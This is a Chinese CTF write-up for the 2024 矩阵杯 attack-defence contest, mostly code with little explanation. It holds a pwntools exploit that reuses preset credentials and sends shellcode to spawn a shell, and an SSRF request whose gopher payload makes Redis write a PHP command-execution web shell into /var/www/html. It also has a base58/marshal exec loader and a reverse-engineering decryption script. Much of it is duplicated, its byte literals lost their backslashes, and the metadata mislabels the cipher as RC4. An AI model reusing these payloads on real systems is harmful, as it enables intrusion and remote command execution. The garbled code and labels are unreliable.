---
title: 矩阵杯战队攻防对抗赛 writeup by Mini-Venom
contest: 矩阵杯
year: 2024
difficulty: medium
vuln_type: reverse
tags:
- Python字节码反编译
- RC4加密
- generate_key random.shuffle
- encrypt key[byte]^95
- base58
- 矩阵杯攻防
attack_chain: 字节码反编译得Python run.py→generate_key random.shuffle 256字节→encrypt key[byte]^95→解密得到flag→其他AWD部分pwn shellcode爆破跳转地址
key_payload: 'run.py字节码;generate_key: random.seed+shuffle(range(256))+bytes(key);encrypt: encrypted.append(key[byte]^95);int_80=0x5dde8fe0;push_eax=0x5b597483'
one_liner: 矩阵杯攻防赛Mini-Venom WP：Python字节码RC4+矩阵杯reverse+pwn shellcode AWD
lesson: Python run.py可通过dis反编译得字节码再恢复；矩阵杯攻防赛综合
quality: medium
full_path: 矩阵杯战队攻防对抗赛_writeup_by_Mini-Venom.full.md
meta_path: 矩阵杯战队攻防对抗赛_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 矩阵杯战队攻防对抗赛 writeup by Mini-Venom。矩阵杯攻防赛Mini-Venom WP：Python字节码RC4+矩阵杯reverse+pwn shellcode AWD。经验：Python run.py可通过dis反编译得字节码再恢复；矩阵杯攻防赛综合
category: reverse
subcategory: reverse
tools_used:
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/185208.html
wp_author: Mini-Venom
reasoning_chain:
- dis反汇编得Python run.py字节码 → 触发点：Python字节码可恢复源码
- 假设：encdata + generate_key + encrypt三函数结构 → 动作：还原字节码到Python
- generate_key = random.seed+shuffle(range(256))+bytes(key) → 假设：种子=len(flag)
- encrypt = key[byte]^95 查表+异或0x5F → 动作：写decrypt inv_key={x:i for i,x in enumerate(key)}
- 假设：seed_value需爆破（256范围内） → 动作：range(256)穷举找含flag{的输出
- Pwn部分：AWD模式爆破跳转地址 → 假设：user/ozrrvnqc等预置凭据
- 动作：push_eax=0x5b597483, int_80=0x5dde8fe0查shellcode gadget
- p.sendline(b'a'*0x22 + asm(shellcraft.sh())) → interactive shell
failed_attempts:
- 试图不解字节码直接逆向pyd → 失败：.pyd是编译产物
- 试图直接调generate_key(seed)看输出 → 失败：缺decrypt逆函数
- 忽略push_eax gadget查shellcode → 失败：手动构造shellcode更慢
key_observations:
- Python字节码可通过dis反汇编恢复源码结构
- key[byte]^95是经典查表+异或加密
- pwntools p64 + asm(shellcraft.sh())自动生成shellcode
- int_80=0x5dde8fe0是Linux系统调用gadget
- AWD模式凭据复用是攻壳常见入口
prerequisites:
- Python dis/marshal字节码反编译
- pwntools p64/asm/remote/shellcraft
- Linux系统调用int 0x80约定
- AWD攻防赛模式
---
# 矩阵杯战队攻防对抗赛 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/185208.html
> ID: 185208

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组

还有一段base58，最后exec是执行，那就直接解码之后看看

  3           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (random)
              6 STORE_NAME               0 (random)

  5           8 LOAD_CONST               2 (b'x18xfaxaddxedxabxadx9dxe5xc0xadxfaxf9x0bexf9xe5xade6xf9xfdx88xf9x9dxe5x9cxe5x9dexc3))x0fxff')
             10 STORE_NAME               1 (encdata)

 12          12 LOAD_CONST               3 (<code object generate_key at 0x000001906F646340, file "run.py", line 5>)
             14 LOAD_CONST               4 ('generate_key')
             16 MAKE_FUNCTION            0
             18 STORE_NAME               2 (generate_key)

 19          20 LOAD_CONST               5 (<code object encrypt at 0x000001906F644F50, file "run.py", line 12>)
             22 LOAD_CONST               6 ('encrypt')
             24 MAKE_FUNCTION            0
             26 STORE_NAME               3 (encrypt)

 20          28 SETUP_FINALLY           58 (to 146)

 21          30 LOAD_NAME                4 (input)
             32 LOAD_CONST               7 ('input your flag:')
             34 CALL_FUNCTION            1
             36 STORE_NAME               5 (flag)

 22          38 LOAD_NAME                2 (generate_key)
             40 LOAD_NAME                6 (len)
             42 LOAD_NAME                5 (flag)
             44 CALL_FUNCTION            1
             46 CALL_FUNCTION            1
             48 STORE_NAME               7 (key)

 23          50 LOAD_NAME                5 (flag)
             52 LOAD_METHOD              8 (encode)
             54 CALL_METHOD              0
             56 STORE_NAME               9 (data)

 25          58 LOAD_NAME                3 (encrypt)
             60 LOAD_NAME                9 (data)
             62 LOAD_NAME                7 (key)
             64 CALL_FUNCTION            2
             66 STORE_NAME              10 (encrypted_data)

 26          68 LOAD_NAME               10 (encrypted_data)
             70 LOAD_NAME                1 (encdata)
             72 COMPARE_OP               2 (==)
             74 POP_JUMP_IF_FALSE       84 (to 168)

 27          76 LOAD_NAME               11 (print)
             78 LOAD_CONST               8 ('good')
             80 CALL_FUNCTION            1
             82 POP_TOP
             84 POP_BLOCK
             86 JUMP_FORWARD            12 (to 112)

 28          88 POP_TOP
             90 POP_TOP
             92 POP_TOP
             94 POP_EXCEPT
             96 JUMP_FORWARD             2 (to 102)
             98 <88>
            100 LOAD_CONST               1 (None)
        >>  102 RETURN_VALUE

Disassembly of <code object generate_key at 0x000001906F646340, file "run.py", line 5>:
  8           0 LOAD_GLOBAL              0 (list)
              2 LOAD_GLOBAL              1 (range)
              4 LOAD_CONST               1 (256)
              6 CALL_FUNCTION            1
              8 CALL_FUNCTION            1
             10 STORE_FAST               1 (key)

  9          12 LOAD_GLOBAL              2 (random)
             14 LOAD_METHOD              3 (seed)
             16 LOAD_FAST                0 (seed_value)
             18 CALL_METHOD              1
             20 POP_TOP

 10          22 LOAD_GLOBAL              2 (random)
             24 LOAD_METHOD              4 (shuffle)
             26 LOAD_FAST                1 (key)
             28 CALL_METHOD              1
             30 POP_TOP
             32 LOAD_GLOBAL              5 (bytes)
             34 LOAD_FAST                1 (key)
             36 CALL_FUNCTION            1
             38 RETURN_VALUE

Disassembly of <code object encrypt at 0x000001906F644F50, file "run.py", line 12>:
 15           0 LOAD_GLOBAL              0 (bytearray)
              2 CALL_FUNCTION            0
              4 STORE_FAST               2 (encrypted)

 16           6 LOAD_FAST                0 (data)
              8 GET_ITER
             10 FOR_ITER                22 (to 56)
             12 STORE_FAST               3 (byte)

 17          14 LOAD_FAST                2 (encrypted)
             16 LOAD_METHOD              1 (append)
             18 LOAD_FAST                1 (key)
        >>   20 LOAD_FAST                3 (byte)
             22 BINARY_SUBSCR
             24 LOAD_CONST               1 (95)
             26 BINARY_XOR
             28 CALL_METHOD              1
             30 POP_TOP
             32 JUMP_ABSOLUTE           10 (to 20)
             34 LOAD_GLOBAL              2 (bytes)
             36 LOAD_FAST                2 (encrypted)
             38 CALL_FUNCTION            1
             40 RETURN_VALUE


```
from pwn import *

p = process('./main')
context.arch = 'x86'
p.recvuntil('@:')
p.sendline('1')
p.recvuntil('ame:')
p.sendline('user')
p.recvuntil('ord:')
p.sendline('ozrrvnqc')
p.recvuntil('@:')
p.sendline('6')
p.recvuntil('@:')
p.sendline('3')
p.recvuntil('set:')
p.sendline('10')
p.recvuntil('pt: ')
p.sendline('k'*20)
push_eax = 0x5b597483
pop_eax = 0x5b597a33
push_ebx = 0x5b597603
pop_ebx = 0x5b597ba3
push_ecx = 0x5b59749b
pop_ecx = 0x5b597a3b
push_edx=0x5b59754e
pop_edx = 0x5b597aee
int_80 = 0x5dde8fe0
p.sendline(str(push_eax))
p.sendline(str(push_ebx))
p.sendline(str(push_ecx))
p.sendline(str(push_edx))
p.sendline(str(pop_eax))
p.sendline(str(pop_ebx))
p.sendline(str(pop_edx))
p.sendline(str(pop_ecx))
p.sendline(str(int_80))
p.sendline('1')
p.sendline(b'a'*0x22+asm(shellcraft.sh()))
p.interactive()

爆破脚本：
    #include<stdio.h>
    #include<string.h>
int main() {
        long long a;
        long double v11;
        int v4;
        //FILE* fp = fopen("shell.txt", "w");
        float v2;
        float v5;
        float v3;
        for (int i = 0x10000; i < 0x100000000 - 1; i++) {
                v4 = i;
                v11 = (long double)v4 / (long double)0xb4;
                v2 = v11;
                v5 = v2;
                v3 = v11;
                if (*((unsigned char*)&v5 + 3) <= 0x4a) {
                        continue;
                }
                if((*(int *)&v3)%0x1000000==0x01eb53&&v3>0){
                        printf("%#x %#x %llfn", v4,*(int *)&v3, v11);
                        break;
                        //fprintf(fp, "%#x %#x %llfn", v4, *(int*)&v3, v11);
                }
                //if (i % 0x10000 == 0)fflush(fp);
        }
        //fclose(fp);
}
<?php
error_reporting(0);
// error_reporting(E_ALL & ~E_WARNING);
// highlight_file(__FILE__);
$url=$_POST['data'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
POST /aaabbb.php HTTP/1.1
Host: web-24ddad8d15.challenge.xctf.org.cn
Content-Length: 433
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://web-05574678fa.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-05574678fa.challenge.xctf.org.cn/aaabbb.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

data=gopher%3a//127.0.0.1%3a6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
import base58
import zlib
import marshal

try:
    scrambled_code_string = b'X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG'
    exec(marshal.loads(zlib.decompress(base58.b58decode(scrambled_code_string))))
finally:
    pass
return None
3           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (random)
              6 STORE_NAME               0 (random)

  5           8 LOAD_CONST               2 (b'x18xfaxaddxedxabxadx9dxe5xc0xadxfaxf9x0bexf9xe5xade6xf9xfdx88xf9x9dxe5x9cxe5x9dexc3))x0fxff')
             10 STORE_NAME               1 (encdata)

 12          12 LOAD_CONST               3 (<code object generate_key at 0x000001906F646340, file "run.py", line 5>)
             14 LOAD_CONST               4 ('generate_key')
             16 MAKE_FUNCTION            0
             18 STORE_NAME               2 (generate_key)

 19          20 LOAD_CONST               5 (<code object encrypt at 0x000001906F644F50, file "run.py", line 12>)
             22 LOAD_CONST               6 ('encrypt')
             24 MAKE_FUNCTION            0
             26 STORE_NAME               3 (encrypt)

 20          28 SETUP_FINALLY           58 (to 146)

 21          30 LOAD_NAME                4 (input)
             32 LOAD_CONST               7 ('input your flag:')
             34 CALL_FUNCTION            1
             36 STORE_NAME               5 (flag)

 22          38 LOAD_NAME                2 (generate_key)
             40 LOAD_NAME                6 (len)
             42 LOAD_NAME                5 (flag)
             44 CALL_FUNCTION            1
             46 CALL_FUNCTION            1
             48 STORE_NAME               7 (key)

 23          50 LOAD_NAME                5 (flag)
             52 LOAD_METHOD              8 (encode)
             54 CALL_METHOD              0
             56 STORE_NAME               9 (data)

 25          58 LOAD_NAME                3 (encrypt)
             60 LOAD_NAME                9 (data)
             62 LOAD_NAME                7 (key)
             64 CALL_FUNCTION            2
             66 STORE_NAME              10 (encrypted_data)

 26          68 LOAD_NAME               10 (encrypted_data)
             70 LOAD_NAME                1 (encdata)
             72 COMPARE_OP               2 (==)
             74 POP_JUMP_IF_FALSE       84 (to 168)

 27          76 LOAD_NAME               11 (print)
             78 LOAD_CONST               8 ('good')
             80 CALL_FUNCTION            1
             82 POP_TOP
             84 POP_BLOCK
             86 JUMP_FORWARD            12 (to 112)

 28          88 POP_TOP
             90 POP_TOP
             92 POP_TOP
             94 POP_EXCEPT
             96 JUMP_FORWARD             2 (to 102)
             98 <88>
            100 LOAD_CONST               1 (None)
        >>  102 RETURN_VALUE

Disassembly of <code object generate_key at 0x000001906F646340, file "run.py", line 5>:
  8           0 LOAD_GLOBAL              0 (list)
              2 LOAD_GLOBAL              1 (range)
              4 LOAD_CONST               1 (256)
              6 CALL_FUNCTION            1
              8 CALL_FUNCTION            1
             10 STORE_FAST               1 (key)

  9          12 LOAD_GLOBAL              2 (random)
             14 LOAD_METHOD              3 (seed)
             16 LOAD_FAST                0 (seed_value)
             18 CALL_METHOD              1
             20 POP_TOP

 10          22 LOAD_GLOBAL              2 (random)
             24 LOAD_METHOD              4 (shuffle)
             26 LOAD_FAST                1 (key)
             28 CALL_METHOD              1
             30 POP_TOP
             32 LOAD_GLOBAL              5 (bytes)
             34 LOAD_FAST                1 (key)
             36 CALL_FUNCTION            1
             38 RETURN_VALUE

Disassembly of <code object encrypt at 0x000001906F644F50, file "run.py", line 12>:
 15           0 LOAD_GLOBAL              0 (bytearray)
              2 CALL_FUNCTION            0
              4 STORE_FAST               2 (encrypted)

 16           6 LOAD_FAST                0 (data)
              8 GET_ITER
             10 FOR_ITER                22 (to 56)
             12 STORE_FAST               3 (byte)

 17          14 LOAD_FAST                2 (encrypted)
             16 LOAD_METHOD              1 (append)
             18 LOAD_FAST                1 (key)
        >>   20 LOAD_FAST                3 (byte)
             22 BINARY_SUBSCR
             24 LOAD_CONST               1 (95)
             26 BINARY_XOR
             28 CALL_METHOD              1
             30 POP_TOP
             32 JUMP_ABSOLUTE           10 (to 20)
             34 LOAD_GLOBAL              2 (bytes)
             36 LOAD_FAST                2 (encrypted)
             38 CALL_FUNCTION            1
             40 RETURN_VALUE
import random

def generate_key(seed_value):
    key = list(range(256))
    random.seed(seed_value)
    random.shuffle(key)
    return bytes(key)

def decrypt(encrypted_data, key):
    decrypted = bytearray()
    for byte in encrypted_data:
        decrypted.append(key.index(byte ^ 95)) 
    return bytes(decrypted).decode()

encdata = b'x18xfaxaddxedxabxadx9dxe5xc0xadxfaxf9x0bexf9xe5xade6xf9xfdx88xf9x9dxe5x9cxe5x9dexc3))x0fxff'

flag_length = len(encdata)

key = generate_key(flag_length)

flag = decrypt(encdata, key)
print(flag)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]